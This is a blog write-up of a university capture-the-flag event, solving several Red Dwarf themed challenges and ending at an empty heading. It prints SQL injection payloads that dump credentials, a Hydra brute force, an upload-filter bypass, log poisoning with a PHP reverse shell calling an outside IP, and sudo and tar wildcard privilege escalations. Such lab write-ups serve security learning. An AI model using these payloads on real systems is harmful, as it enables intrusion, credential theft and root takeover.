Over xmas 2019, I took part in a CTF made by my university. The following are the challeneges I overcame and the things I learned whilst doing so.

*This is a Red Dwarf themed CTF, if you don't know what that is, I highly suggest you watch it*

## Science Room 1:
The first was a login screen that I had to find a way to get around...

![ScinceLabLogin](/SiteImages/CTFpics/Sciencelab1Login.png)

Turns out that this login form is vulnerable to a simple SQL injection attack.

Putting `admin' or '1'='1` in both boxes logged us in and gave us the flag!
This worked since 1=1 is always true so then the verification is never made, this should work if sql injection is possible.

- Sanitise user inputs.

## Science Room 2:
I am greeted with the same login screen as before, but something has changed...

![ScienceLab2Login](/SiteImages/CTFpics/Sciencelab2login.png)

Logging in the same way  as before gave me a clue for the user creds.
_Username is 'MrFlibble'_

But what if I need the password?

Taking a look at the http-post form properties in source code, can see the data that is submitted with the form.

![ScienceLab2Form](/SiteImages/CTFpics/Sciencelab2postform.png)

The failure condition (text that appears when login fails) is "Login Fails" and we know the password is in the top 10k list.

With this information, we can craft a hydra query to brute force the password.

![Sciencelab2hydra](/SiteImages/CTFpics/Sciencelab2Hydra.png)

And woo hoo! We got the password 'midnight'

Now we can SSH into the machine with username mrflibble and password midnight.

- You should limit the amount of password attempts before a lockout.

![Rarityhappy](/SiteImages/tumblr_m4aapqcT8O1r3k1m8o6_500.png)

To get root, I used the `sudo -l` command to see what things I can run with elevated privileges...

![Sciencelab2Sudo](/SiteImages/CTFpics/Sciencelab2Sudo.png)

We are in luck! It seems we can run netcat with root privileges! 

Now all I needed to do was run the following command on the target machine and set up a listener on my own machine to get a reverse shell...

![ScienceLab2REV](/SiteImages/CTFpics/Sciencelab2RevShell.png)

And we got root! :) 

![Science2Root](/SiteImages/CTFpics/Sciencelab2Root.png)


## Science Room 3:
The login screen has been changed again, it now says we have 100 attempts before we are logged out and the login process is separated into two seperate pages, one for username and password and one for entering a pin code... how will we get around this one?!

It seems like they want us to make an efficient algorithm to brute force the passwords... but sql injection is viable as I am still able to log in with `admin' or '1'='1`.

`' UNION ALL SELECT 1,2,3 –` Returns 2, so the second argument(middle one) will only be returned. I need 3 args since php expects 3.

![SQL1](/SiteImages/CTFpics/ScienceroomSQL1.png)

Use concat to return multiple things at once...

`' UNION ALL SELECT 1, CONCAT(column_name,' ',table_schema,' ',table_name),3 FROM information_schema.columns WHERE table_schema='maindb' -- `

Gives us the table and column name we can use!

![SQL2](/SiteImages/CTFpics/ScienceroomSQL2.png)

Therefore column name is id, table schema is maindb and table name is hardusers.
Now we can find a way to select the usernames and passwords from the harduser table...

`' UNION ALL SELECT 1, CONCAT(name, ' ',password),3 FROM hardusers -- `

Gives us some creds :)

![SQL3](/SiteImages/CTFpics/ScienceroomSQL3.png)

Strangely, this login doesnt work... try changing the id(since id is the col number) to see if there are more creds... and there are! Using the following command with id=2 and id=3 in the sql statement I was able to get 2 more sets of creds:

`' UNION ALL SELECT 1, CONCAT(name, ' ',password),3 FROM hardusers WHERE id=2 -- `

_Todhunter Abs01ut3Sm3gh3ad
Lanstrom aA12!^gtfo! _

I was able to ssh into the machine as the Lanstrom user...

Checking `sudo -l` , cant run sudo with any commands...
In /home directory there is also a user named todhunter.
Change user to Todhunter with `su todhunter` command and use password I got earlier.

![sudo3](/SiteImages/CTFpics/ScienceroomSudo.png)

As todhunter user, we can execute the timeout command as root.

GTFO bins → `sudo timeout --foreground 7d /bin/sh`
Get root! :D

## Starbug 1:
In this site, we can upload images and view it in the star charts...
Maybe we can bypass the image upload to upload a php reverse shell. Uploading it straight up doesn't work and just renaming the file also doesn't work.

We can use the url to view files on the server by adding the file to the end... however, it adds .php to everything we put in so I had to add a null byte to the end. (%00)

![SBURL1](/SiteImages/CTFpics/Starbug1URL.png)

Manage to get php reverse shell to upload by putting _GIF98a;_ to start of file and renaming to _shell.php.gif_.
This tricks the uploader into thinking that my reverse shell file has GIF encoding.
Point the reverse shell at my machine.

![SBUP](/SiteImages/CTFpics/Starbug1Upload.png)

The file name changes as seen here, we can execute the shell by viewing it through the url and adding the null byte to the end...

![SBREV](/SiteImages/CTFpics/Starbug1RevShell.png)

Looking through pspy, a command runs every minute or so that copies root.txt from root directory to xxx then deletes it again.

In the _backup.sh_ file:

![SBBAK](/SiteImages/CTFpics/Starbug1Backupfile.png)

Looks like a STAR bug may be involved! The * means that all files are affected  and if we add file names with – at the start, as if it was an argument for the _chown_ command, could get it to drop a shell for us.

`–reference=RFILE` (use RFILE’s owner and group rather than specifying OWNER: GROUP values) 
Make a test file and make a file named _–reference=test_. The test file is owned by me... therefore it will chown on all files in backups dir with my user and I will be able to read root.txt!

Cant use test since a test file is already in the directory owned by root!
Use another name instead...


![SBROOT](/SiteImages/CTFpics/Starbug1Root.png)

And it worked! Get root flag.

## Starbug 2:
This one is the same website, but the same file upload method wont work this time. There are also log files in the system status menu that we can view:

![SBUGLOG](/SiteImages/CTFpics/Starbug2Logs.png)

The url include vulnerability is still here and it doesnt add .php to the end so a null byte isnt needed!

![SBURL2](/SiteImages/CTFpics/Starbug2URL.png)

We can change the user agent in the log file with a user agent spoofer to something more useful perhaps... 
We can include the log file in the url to execute the code.

Changing user agent to `<?php phpinfo(); ?>` gives us the php info page when we execute the log file via the url. 

![SB2PHP](/SiteImages/CTFpics/Starbug2php.png)

With this, can change user agent to something to drop a reverse shell...
`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.42.5/1234 0>&1'"); ?>`
Using this as a user agent got a reverse shell dropped!

Can't read _user.txt_... check `sudo -l`. Can run _vi _ command as starbug user.

![SB2SUDO](/SiteImages/CTFpics/Starbug2Sudo.png)

Find a way to drop a shell with vi so we can have a shell as starbug user.
Need to upgrade to terminal first...

`python -c 'import pty; pty.spawn("/bin/sh")'`

`sudo -u starbug vi -c ':!/bin/sh' /dev/null`

Got a shell as starbug user with this command... get _user.txt_ file.

![SBSUDO2](/SiteImages/CTFpics/Starbug2Sudo2.png)

Can run backup as root...
Try run backup and see what happens.

![SB2BAK](/SiteImages/CTFpics/Starbug2Backup.png)

Looks like a STAR bug is involved!!
Uses _tar_ command, can drop a priv shell with the following command...

`sudo tar -cf /dev/null /dev/null --checkpoint=1 –checkpoint-action=exec=/bin/sh`

make a file named _–checkpoint=1_ and another named _–checkpoint-action=exec=/bin/sh_
Make these files in my _/home/starbug_ directory and backup to _/home/starbug_...
execute _backup_ aaaaannnnnnddddd
Drops root shell! Get root flag :)

## Intercept: 
